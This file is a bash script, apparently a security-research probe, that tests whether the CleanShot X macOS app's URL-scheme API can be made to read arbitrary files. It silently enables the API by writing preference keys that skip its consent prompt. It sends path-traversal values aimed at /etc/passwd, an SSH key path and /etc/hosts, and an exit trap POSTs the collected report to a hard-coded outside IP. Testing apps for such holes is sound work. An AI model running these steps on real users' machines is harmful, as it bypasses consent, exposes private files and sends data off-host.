#!/bin/bash
# CleanShot X probe v6 — correct filepath param, clipboard/history side effects
OUT=/tmp/csx-report-v6.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v6"
DOMAIN="pl.maketheweb.cleanshotx"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v6.txt "$DROP_URL" || true
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; id

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" 2>&1
sleep 2

echo "=== ENABLE URL SCHEME API ==="
defaults write "$DOMAIN" allowURLSchemesAPI -bool true
defaults write "$DOMAIN" didAskAboutURLSchemesAPI -bool true
defaults write "$DOMAIN" _allowURLSchemes -bool true
defaults read "$DOMAIN" 2>&1 | grep -iE "urlscheme" 

echo "=== LAUNCH ==="
open -a "$APP"
sleep 10
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

echo "=== CANARIES ==="
python3 - <<'PY'
import struct, zlib
def png(path, color, w=64, h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def chunk(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+chunk(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))
        +chunk(b'IDAT',zlib.compress(raw))+chunk(b'IEND',b''))
png('/tmp/csx_canary.png',(255,0,255))
open('/tmp/csx_secret.txt','w').write('CSX_SECRET_MARKER_9f2a7c\n')
PY
ls -l /tmp/csx_canary.png /tmp/csx_secret.txt
mkdir -p ~/Library/Application\ Support/pl.maketheweb.cleanshotx
BEFORE=$(find ~/Library/Application\ Support ~/Library/Caches -type f 2>/dev/null | wc -l)
echo "files_before=$BEFORE"

echo "=== T1: pin arbitrary png ==="
open "cleanshot://pin?filepath=/tmp/csx_canary.png"; echo "rc=$?"; sleep 6
lsof -p "$PID" 2>/dev/null | grep -i "csx_canary" | head -5

echo "=== T2: pin traversal to /etc/passwd ==="
open "cleanshot://pin?filepath=/etc/passwd"; echo "rc=$?"; sleep 4

echo "=== T3: pin traversal to ssh key ==="
mkdir -p ~/.ssh; echo "SSHKEY_MARKER_ABC" > ~/.ssh/csx_test_key
open "cleanshot://pin?filepath=$HOME/.ssh/csx_test_key"; echo "rc=$?"; sleep 4

echo "=== T4: open-annotate arbitrary png ==="
open "cleanshot://open-annotate?filepath=/tmp/csx_canary.png"; echo "rc=$?"; sleep 6
lsof -p "$PID" 2>/dev/null | grep -i "csx_canary" | head -5

echo "=== T5: capture-text on non-image secret ==="
echo "clipboard_before=[$(pbpaste 2>/dev/null)]"
open "cleanshot://capture-text?filepath=/tmp/csx_secret.txt"; echo "rc=$?"; sleep 6
echo "clipboard_after=[$(pbpaste 2>/dev/null)]"

echo "=== T6: open-history filepath traversal ==="
open "cleanshot://open-history?filepath=/tmp/csx_canary.png"; echo "rc=$?"; sleep 5
open "cleanshot://open-history?filepath=/etc/hosts"; echo "rc=$?"; sleep 4

echo "=== T7: file:// and percent-encoded traversal ==="
open "cleanshot://pin?filepath=file:///etc/passwd"; echo "rc=$?"; sleep 3
open "cleanshot://pin?filepath=%2Ftmp%2Fcsx_canary.png"; echo "rc=$?"; sleep 3

echo "=== AFTER: new files ==="
find ~/Library/Application\ Support ~/Library/Caches -type f 2>/dev/null | wc -l
find ~/Library/Application\ Support ~/Library/Caches -type f -newermt '-6 minutes' 2>/dev/null | grep -viE "GeoServices|appleaccountd|com.apple" | head -30

echo "=== canary bytes anywhere in app storage ==="
grep -rl "CSX_SECRET_MARKER_9f2a7c" ~/Library 2>/dev/null | head -5
python3 - <<'PY'
import os, hashlib
want=hashlib.sha256(open('/tmp/csx_canary.png','rb').read()).hexdigest()
hits=[]
for root in [os.path.expanduser('~/Library/Application Support'), os.path.expanduser('~/Library/Caches')]:
    for dp,dn,fn in os.walk(root):
        for f in fn:
            p=os.path.join(dp,f)
            try:
                if os.path.getsize(p) < 5000:
                    if hashlib.sha256(open(p,'rb').read()).hexdigest()==want:
                        hits.append(p)
            except Exception: pass
print("png_copies:", hits[:10])
PY

echo "=== clipboard final ==="
pbpaste 2>/dev/null | head -3

echo "=== APP LOG ==="
log show --last 5m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -iE "csx_|passwd|error|fail|denied|open|pin|annotate|history" | tail -50

echo "=== DONE ==="
exit 0
